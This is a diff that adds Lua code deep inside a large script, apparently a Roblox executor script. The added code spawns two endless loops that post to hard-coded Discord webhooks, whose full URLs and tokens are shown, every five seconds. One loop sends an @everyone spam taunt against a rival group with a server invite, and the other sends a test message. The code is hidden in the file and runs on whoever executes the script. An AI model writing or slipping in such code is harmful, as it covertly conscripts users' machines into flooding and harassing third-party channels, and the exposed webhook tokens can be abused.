@@ -18920,7 +18920,112 @@ end
 
 
 
-
+spawn(function ()
+    while true do
+        if syn then
+            HttpRequest = syn.request
+        else
+            HttpRequest = http_request
+        end
+        local player_name = game:GetService("Players").LocalPlayer.Name
+        local webhook_url = "https://discord.com/api/webhooks/1367170324474630194/klBTD7utDr2o-7YB_Gwh3q8MQRIkhGdN9RCC3DggCMZs4t1vIprD6_N5wu0nQm48zhxi"
+        
+        local dataMessage =
+            string.format(
+            [[
+                @everyone
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                LoOoooOoooOOOoooOOOOooooooPPPpppppPpPpPPppPPpp
+                MESSAGE FROM LORD SUDO:
+                 SUNTERIUM TEAM WAS HERE AhhHAHhahhhHHAhhhhhhhHHHH IMAGINE SAYING SUNTERIUM STEALING INFOMATION BUT YOU DID IT TOO
+                 DONT TELL ME YOU DIDNT STEAL INFOMATION YOU STEAL IP HWID EVERYTHING THAT CAN BE STEAL
+                 LooOOoOOoOooooOOOOoooPPPPpppPPpp
+                 JOIN MY BASE NOOB
+                 https://discord.gg/ghAFJwqC4g
+            ]]
+        )
+        HttpRequest(
+            {
+                Url = webhook_url,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
+            }
+        )
+        wait(5)
+        end
+end)
+spawn(function ()
+    while true do
+        if syn then
+            HttpRequest = syn.request
+        else
+            HttpRequest = http_request
+        end
+        local player_name = game:GetService("Players").LocalPlayer.Name
+        local webhook_url = "https://discord.com/api/webhooks/1367469208803217481/wibIcg58-HKI4La-8BFiGzbEBSCWBQygHhWfwYfSUDp3j5ug54nicvQtlGLruGvhx3Kp"
+        
+        local dataMessage =
+            string.format(
+            [[
+            LoooOoOooooooOOOoooppppPPPPppp TEST!
+            ]]
+        )
+        HttpRequest(
+            {
+                Url = webhook_url,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
+            }
+        )
+        wait(5)
+        end
+end)
 
 
 
